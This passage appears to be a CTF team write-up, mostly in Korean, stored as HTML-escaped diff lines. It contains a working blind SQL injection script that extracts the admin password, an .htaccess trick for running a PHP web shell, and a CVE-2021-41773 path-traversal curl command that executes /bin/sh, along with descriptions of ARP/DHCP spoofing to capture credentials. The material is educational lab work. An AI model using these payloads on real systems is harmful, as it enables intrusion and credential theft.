-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/login&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;password=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;ses&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ses&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# login failed.
-&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    
-    &lt;span class=&quot;n&quot;&gt;db_name_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;db_name&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'postgres'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;table_name&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'registered_users'&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;payload_upper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&amp;gt;{}+--'''&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;payload_lower&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&amp;lt;{}+--'''&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;payload_equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))={}+--'''&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cmpmin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cmpmax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;cmpmin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmpmax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;cmpmax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;cmpmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmpmax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmpmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;RuntimeError&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;--host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;--port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and noticed that admin password is keep changing when revert machine.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;7-of-hearts&quot;&gt;7 of Hearts&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;15122/tcp로 ssh를 이용하여 접근 할 수 있다. 다만 아무런 credential이 없어서 로그인 하기 위해 몇가지 방법을 시도 해 보았다:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Dictionary based brute focing attack&lt;/li&gt;
-  &lt;li&gt;Rule based brute forcing attach (root, 1 length word to 3 length word.)&lt;/li&gt;
-  &lt;li&gt;Credential stuffing (credentials are from other challeges.)&lt;/li&gt;
-  &lt;li&gt;Internal network access via other challenge’s reverse shell (maybe docker-compose)&lt;/li&gt;
-  &lt;li&gt;Packet capture&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;하지만 이 중 아무런 성과를 얻지 못했고, 다음과 같이 상황이 흘러가게 되었다.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Jaehoon Jang&lt;/strong&gt;님이 DHCP client port가 열려 있는것을 확인 했다 (근데 분명 처음 스캐닝 돌릴 때는 열려있지 않았다.)&lt;/li&gt;
-  &lt;li&gt;DHCP client를 속여서 공격하거나, 1-day exploit을 시도 하려고 했다.&lt;/li&gt;
-  &lt;li&gt;몇가지 시도 도중, 타겟 서버의 ip를 kali의 ip로 변경시키려는 시도를 했다. 참고로 arp spoofing, dhcp spoofing 등을 수행했다.&lt;/li&gt;
-  &lt;li&gt;패킷 캡쳐를 수행 했다.&lt;/li&gt;
-  &lt;li&gt;그러자 3~5분 간격으로 kali의 23번 포트에 문제 서버에서 접근하는것을 발견했다.&lt;/li&gt;
-  &lt;li&gt;kali의 23/tcp에 telnet 서비스를 열어두고 패킷 캡쳐를 수행했다.&lt;/li&gt;
-  &lt;li&gt;로그인 정보를 획득할 수 있었다.&lt;/li&gt;
-  &lt;li&gt;성공적으로 ssh login에 성공했다.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;정말로 당황스러운 문제가 아닐 수 없다… 이 문제 때문에 2등, 3등을 놓쳤다니, 아직도 화가 나는건 사실이다 :(&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;8-of-clubs&quot;&gt;8 of Clubs&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;sickcodes&lt;/strong&gt; from &lt;strong&gt;PostalTimes&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;20123/tcp로 ssh를 이용하여 접근할 수 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypt_flag.py&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypted_flag&lt;/code&gt; 파일이 존재한다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypt_flag.py&lt;/code&gt; 42번줄의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return fernet.encrypt(file)&lt;/code&gt;을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return fernet..decrypt()&lt;/code&gt;로 수정한 후 다음과 같이 문제를 해결할 수 있었다:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python encrypt_flag.py encrypted_flag out --debug
-$ file out
-out: PNG image data, 500 x 700, 8-bit/color RGBA, non-interlaced
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;9-of-diamonds&quot;&gt;9 of Diamonds&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;Jaehon Jang&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;8080/tcp로 http를 이용하여 접근할 수 있다. admin cookie를 변조하여 문제를 해결할 수 있었다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;9-of-spades&quot;&gt;9 of Spades&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;timwr&lt;/strong&gt; from &lt;strong&gt;PostalTimes&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;20055/tcp로 http를 이용하여 접근할 수 있다. 파일 업로드를 할 수 있는데, 많은 필터링이 존재한다. 하지만 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; 파일을 업로드하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htm&lt;/code&gt; 파일이 php 실행이 가능하도록 수정한 후, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htm&lt;/code&gt; 웹쉘을 업로드하여 문제를 해결할 수 있었다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AddType application/x-httpd-php .html .htm
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;10-of-clubs&quot;&gt;10 of Clubs&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;12380/tcp에 http로 접근이 가능하다. http 버전이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2021-41773&lt;/code&gt;에 취약하여 이를 이용하여 RCE를 할 수 있었다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl --path-as-is -v -X POST 'http://localhost:31337/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d &quot;echo;cat /secret/safe/flag.png&quot; -o /tmp/flag.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
